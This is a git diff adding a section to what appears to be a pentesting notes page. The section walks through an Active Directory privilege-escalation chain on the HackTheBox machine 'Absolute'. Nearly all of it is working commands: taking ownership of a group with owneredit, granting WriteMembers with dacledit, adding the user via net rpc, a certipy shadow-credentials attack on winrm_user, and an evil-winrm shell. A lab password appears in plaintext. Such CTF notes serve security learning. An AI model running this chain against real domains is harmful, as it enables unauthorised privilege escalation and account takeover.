@@ -1335,3 +1335,66 @@ impacket-mssqlclient administrator@dc1.scrm.local -k -no-pass
 ```
 
 </details>
+
+<details>
+
+<summary>Exploiting Owning a Group &#x26;&#x26; Group GenericWrite on User</summary>
+
+<figure><img src="../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>
+
+Ensure /etc/krb5.conf:
+
+```bash
+[libdefaults]
+    default_realm = ABSOLUTE.HTB
+    kdc_timesync = 1
+    ccache_type = 4
+    forwardable = true
+    proxiable = true
+    fcc-mit-ticketflags = true
+[realms]
+    ABSOLUTE.HTB = {
+        kdc = dc.absolute.htb
+        admin_server = dc.absolute.htb
+        default_domain = absolute.htb
+    }
+
+```
+
+```bash
+kinit m.lovegod
+
+# Make the user m.lovegod owner of the group "Network Audit"
+python3 /usr/share/doc/python3-impacket/examples/owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
+```
+
+<figure><img src="../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>
+
+<pre class="language-bash"><code class="lang-bash"><strong># Give full control of the Network Audit group to the user m.lovegod
+</strong><strong>impacket-dacledit -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights WriteMembers
+</strong></code></pre>
+
+<figure><img src="../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+# Add the user m.lovegod to the group Network Audit
+net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
+net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
+
+# Check if ADCS is installed
+certipy-ad find -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb
+
+# Request new TGT and perform the attack
+kinit m.lovegod
+certipy-ad shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user
+```
+
+<figure><img src="../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+export KRB5CCNAME=winrm_user.ccache
+evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
+```
+
+</details>
+
